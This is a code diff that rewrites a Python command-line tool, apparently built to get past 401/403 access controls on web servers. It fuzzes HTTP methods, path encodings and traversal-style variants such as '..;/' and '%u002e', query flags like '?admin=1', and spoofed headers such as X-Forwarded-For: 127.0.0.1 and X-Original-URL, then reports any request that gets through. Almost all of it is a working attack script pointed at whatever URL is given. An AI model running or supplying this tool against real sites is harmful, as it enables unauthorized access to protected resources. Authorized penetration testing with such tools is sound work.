@@ -1,103 +1,129 @@
 import requests
 import argparse
 import sys
-from urllib.parse import urlparse, quote
+import copy
+from urllib.parse import urlparse
 
-# Disable SSL warnings
+# Disable SSL warnings for research environments
 requests.packages.urllib3.disable_warnings()
 
-SUCCESS_LOG = []
+class Bypasser:
+    def __init__(self, target_url):
+        self.parsed = urlparse(target_url)
+        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
+        self.path = self.parsed.path if self.parsed.path else "/"
+        self.methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
+        self.successes = []
+        self.session = requests.Session()
+        self.session.verify = False
 
-def get_args():
-    parser = argparse.ArgumentParser(description="Ultimate 403/401 Bypass Auditor")
-    parser.add_argument("-u", "--url", required=True, help="Full target URL")
-    return parser.parse_args()
+    def get_path_variations(self):
+        path = self.path
+        if not path.startswith('/'): path = '/' + path
+        parts = list(filter(None, path.split('/')))
+        
+        v = set([path])
+        # 1. Case Variations
+        v.add(path.upper())
+        v.add(path.lower())
+        v.add(path.title())
+        
+        # 2. Basic Path Manipulation
+        variations = [
+            path + "/", path + "/.", "/." + path, 
+            path + "..;/", path + "/..;/", 
+            path.replace("/", "//"), path.replace("/", "/./"),
+            path + ".json", path + ".php", path + ".html",
+            path + "?", path + "??", path + "#", path + "%20"
+        ]
+        v.update(variations)
 
-def generate_variations(path):
-    if not path.startswith('/'): path = '/' + path
-    v = set([path])
-    
-    # 1. Path Obfuscation
-    v.add(path + "/")
-    v.add(path + "/.")
-    v.add(path + "..;/")
-    v.add(path.upper())
-    v.add(path.replace("/", "//"))
-    v.add("/." + path)
-    
-    # 2. Query Parameter Fuzzing (New Research)
-    queries = ["?method=json", "?format=json", "?_method=GET", "?debug=true", "?admin=1"]
-    for q in queries:
-        v.add(path + q)
+        # 3. Dynamic Encoding (The "Dynamic" part you asked for)
+        # Encodes each character in the path one by one
+        for i in range(len(path)):
+            if path[i] == '/': continue
+            encoded_char = f"%{ord(path[i]):02x}"
+            v.add(path[:i] + encoded_char + path[i+1:])
+            
+        # 4. Unicode Obfuscation
+        v.add(path.replace(".", "%u002e"))
+        
+        # 5. Query Parameter Fuzzing
+        queries = ["?method=json", "?format=json", "?_method=GET", "?debug=true", "?admin=1", "?admin=true"]
+        for q in queries:
+            v.add(path + q)
 
-    # 3. Unicode & Encoding
-    v.add(path.replace("a", "%61")) # Simple encoding
-    v.add(path.replace("/", "%252f")) # Double encoding slash
-    v.add(path.replace(".", "%u002e")) # Unicode dot
-    
-    return list(v)
+        return list(v)
 
-def audit(target_url):
-    parsed = urlparse(target_url)
-    base_url = f"{parsed.scheme}://{parsed.netloc}"
-    path = parsed.path if parsed.path else "/"
-    
-    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
-    
-    # Advanced Security Headers
-    headers_list = [
-        {"X-Forwarded-For": "127.0.0.1"},
-        {"X-Forwarded-Host": "localhost"},
-        {"X-Original-URL": path},
-        {"X-Rewrite-URL": path},
-        {"X-Custom-IP-Authorization": "127.0.0.1"},
-        {"X-Remote-IP": "127.0.0.1"},
-        {"X-Original-Method": "GET"},
-        {"X-Forwarded-Proto": "http"},
-        {"Content-Type": "application/json"} # Testing if format change bypasses WAF
-    ]
+    def get_headers(self):
+        return [
+            {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Forwarded-Host": "localhost"},
+            {"X-Host": "127.0.0.1"},
+            {"X-Original-URL": self.path},
+            {"X-Rewrite-URL": self.path},
+            {"X-Remote-IP": "127.0.0.1"},
+            {"X-Client-IP": "127.0.0.1"},
+            {"X-Custom-IP-Authorization": "127.0.0.1"},
+            {"X-Originating-IP": "127.0.0.1"},
+            {"X-Forwarded-Proto": "http"},
+            {"X-Original-Method": "GET"},
+            {"Referer": self.base_url + self.path}
+        ]
 
-    print(f"[*] Auditing: {base_url}{path}\n")
-    print(f"{'METHOD':<8} | {'STATUS':<6} | {'SIZE':<8} | {'PAYLOAD'}")
-    print("-" * 75)
+    def run(self):
+        print(f"[*] Auditing: {self.base_url}{self.path}")
+        print(f"{'METHOD':<8} | {'STATUS':<6} | {'SIZE':<8} | {'PAYLOAD'}")
+        print("-" * 80)
 
-    variations = generate_variations(path)
-    session = requests.Session()
-    session.verify = False
+        path_variations = self.get_path_variations()
+        headers_to_test = self.get_headers()
 
-    for method in methods:
-        for p_payload in variations:
-            url = base_url + p_payload
-            try:
-                # Baseline
-                res = session.request(method, url, timeout=5, allow_redirects=False)
-                print(f"{method:<8} | {res.status_code:<6} | {len(res.content):<8} | {p_payload}")
+        for method in self.methods:
+            for p_var in path_variations:
+                full_url = self.base_url + p_var
                 
-                if res.status_code == 200:
-                    SUCCESS_LOG.append(f"Method: {method} | Path: {p_payload}")
+                try:
+                    # --- Step 1: Establish Baseline ---
+                    base_res = self.session.request(method, full_url, timeout=5, allow_redirects=False)
+                    base_status = base_res.status_code
+                    base_size = len(base_res.content)
+                    
+                    print(f"{method:<8} | {base_status:<6} | {base_size:<8} | {p_var}")
+                    
+                    if base_status in [200, 201, 204]:
+                        self.successes.append(f"Method: {method} | Path: {p_var} (Direct Access)")
 
-                # If blocked, try Header Injections
-                if res.status_code in [401, 403]:
-                    for h in headers_list:
-                        h_res = session.request(method, url, headers=h, timeout=5, allow_redirects=False)
-                        if h_res.status_code == 200:
-                            print(f"  [!] SUCCESS WITH HEADER: {h}")
-                            SUCCESS_LOG.append(f"Method: {method} | Path: {p_payload} | Header: {h}")
-            except:
-                continue
+                    # --- Step 2: Header Fuzzing (Only if Baseline is 401/403/405) ---
+                    if base_status in [401, 403, 405]:
+                        for h_payload in headers_to_test:
+                            h_res = self.session.request(method, full_url, headers=h_payload, timeout=5, allow_redirects=False)
+                            
+                            # Check if the header changed the outcome
+                            if h_res.status_code != base_status:
+                                if h_res.status_code in [200, 201, 204]:
+                                    print(f"  [!] BYPASS FOUND: {h_payload}")
+                                    self.successes.append(f"Method: {method} | Path: {p_var} | Header: {h_payload}")
+                except Exception as e:
+                    continue
 
-def print_summary():
-    print("\n" + "="*50)
-    print("             SUCCESSFUL BYPASSES")
-    print("="*50)
-    if not SUCCESS_LOG:
-        print("No successful 200 OK bypasses found.")
-    else:
-        for entry in set(SUCCESS_LOG): # Set to remove duplicates
-            print(f"[+] {entry}")
-    print("="*50)
+    def print_summary(self):
+        print("\n" + "="*60)
+        print("                 FINAL BYPASS REPORT")
+        print("="*60)
+        if not self.successes:
+            print("[-] No successful bypasses identified.")
+        else:
+            # Use set to remove duplicates if any
+            for report in sorted(set(self.successes)):
+                print(f"[+] {report}")
+        print("="*60)
 
 if __name__ == "__main__":
-    args = get_args()
-    audit(args.url)
-    print_summary()
+    parser = argparse.ArgumentParser(description="Professional 401/403 Bypass Tool")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    args = parser.parse_args()
+
+    auditor = Bypasser(args.url)
+    auditor.run()
+    auditor.print_summary()
